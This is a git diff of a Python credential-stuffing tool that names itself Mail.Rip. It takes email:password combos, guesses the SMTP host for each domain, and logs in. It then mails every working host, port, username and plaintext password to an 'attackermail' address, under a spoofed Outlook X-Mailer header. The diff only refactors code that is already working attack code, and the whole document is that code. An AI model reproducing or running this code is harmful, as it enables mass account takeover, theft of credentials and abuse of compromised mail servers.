@@ -79,8 +79,7 @@ def cleaner():
             os.system('cls')
         else:
             os.system('clear')
-    except:
-        pass
+    except: pass
 
 #mailcheck == checks email user input with regex:
 def mailcheck(email):
@@ -133,7 +132,7 @@ def finder(unkdom):
                     findsmtp.quit()
                 except: pass
                 z = str(y)
-                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Connection established, HOST is: ' + str(y) + ' ...\n')
+                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Connection established, HOST is: ' + str(z) + ' ...\n')
                 break
             except:
                 try:
@@ -142,14 +141,14 @@ def finder(unkdom):
                         findsmtp.quit()
                     except: pass
                     z = str(y)
-                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Connection established, HOST is: ' + str(y) + ' ...\n')
+                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Connection established, HOST is: ' + str(z) + ' ...\n')
                     break
                 except:
-                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Connection failed for guessed HOST: ' + str(y) + ' ...\n')
+                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Connection failed for guessed HOST: ' + str(z) + ' ...\n')
                     continue
         return z
     except BaseException:
-        z = None
+        z = str('failed')
         print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Cannot find working SMTP host (!) for: ' + str(unkdom) + ' ...\n')
         return z
 
@@ -245,10 +244,10 @@ def sendcheckmsg(mailhost, mailport, mailuser, mailpass):
         randomid = str(randomid[0:8])
         randomid = randomid.upper()
         #prepare e-mail content for sending check:
-        mailsender = str(str(mailuser.split("@")[0]) + ' <' + str(mailuser) + '>')
+        mailsender = str(mailuser)
         mailreceiver = str(attackermail)
         mailsubject = str('Your test result for ID#' + str(randomid) + ' is available')
-        mailcontent = str('Hello there!\nIf you read this, the SMTP below succeeded in the mailsending test.'
+        mailcontent = str('\n\nHello there!\nIf you read this, the SMTP below succeeded in the mailsending test.'
                           + ' Its details are:\n\nHOST: ' + str(mailhost) + ',\nPORT: ' + str(mailport) + ',\nUSER: '
                           + str(mailuser) + ',\nPASS: ' + str(mailpass) + '.\n\n'
                           + 'Do you like Mail.Rip? Then donate, please!\nBTC: 1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf\n'
@@ -256,9 +255,9 @@ def sendcheckmsg(mailhost, mailport, mailuser, mailpass):
                           + 'Best wishes,\nDrPython3')
         #prepare the e-mail for sending:
         check_msg = EmailMessage()
-        check_msg.add_header('To', mailreceiver)
-        check_msg.add_header('From', mailsender)
-        check_msg.add_header('Subject', mailsubject)
+        check_msg.add_header('To', str(mailreceiver))
+        check_msg.add_header('From', str(mailsender))
+        check_msg.add_header('Subject', str(mailsubject))
         check_msg.add_header('X-Priority', '1')
         check_msg.add_header('X-Mailer', 'Microsoft Office Outlook, Build 11.0.5510')
         check_msg.set_content(str(mailcontent))
@@ -266,30 +265,23 @@ def sendcheckmsg(mailhost, mailport, mailuser, mailpass):
         try:
             #try SSL-connection:
             mailer = smtplib.SMTP_SSL(str(mailhost), int(mailport), context=msgcontext)
-            mailer.ehlo_or_helo_if_needed()
         except:
             try:
                 #try non-SSL connection:
                 mailer = smtplib.SMTP(str(mailhost), int(mailport))
-                mailer.ehlo_or_helo_if_needed()
-                #try to start TLS:
-                try:
-                    mailer.starttls(context=msgcontext)
-                    mailer.ehlo_or_helo_if_needed()
-                except: pass
-            #on errors quit and return status 'false' to checker:
             except:
-                try:
-                    mailer.quit()
-                except: pass
                 print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Sending e-mail failed (!) for: ' + str(mailuser)
                       + ' ...\n')
                 statusmsg = False
                 return statusmsg
+        #try to start TLS:
+        try:
+            mailer.starttls(context=msgcontext)
+        except: pass
         #try login and sendmail, if ok return 'true' else 'false' to checker:
         try:
             mailer.login(str(mailuser), str(mailpass))
-            mailer.sendmail(mailsender, mailreceiver, check_msg.as_bytes())
+            mailer.sendmail(str(mailsender), str(mailreceiver), check_msg.as_bytes())
             mailer.quit()
             statusmsg = True
             return statusmsg
@@ -297,7 +289,8 @@ def sendcheckmsg(mailhost, mailport, mailuser, mailpass):
             try:
                 mailer.quit()
             except: pass
-            print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Sending e-mail failed (!) for: ' + str(mailuser) + ' ...\n')
+            print(Fore.LIGHTRED_EX + Style.BRIGHT + '(!) Sending e-mail failed (!) for: ' + str(mailuser)
+                  + ' ...\n')
             statusmsg = False
             return statusmsg
 
@@ -336,7 +329,7 @@ def checkmate():
                 #if not found in dictionary, start search for attackable SMTP host:
                 try:
                     newhost = finder(str(l[0].split("@")[1]))
-                    if newhost == None:
+                    if newhost == str('failed'):
                         print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Bad luck, no host found! Skipping: ' + str(l[0]) + ':'
                               + str(l[1]) + ' ...\n')
                         skips(str(l[0]) + ':' + str(l[1]))
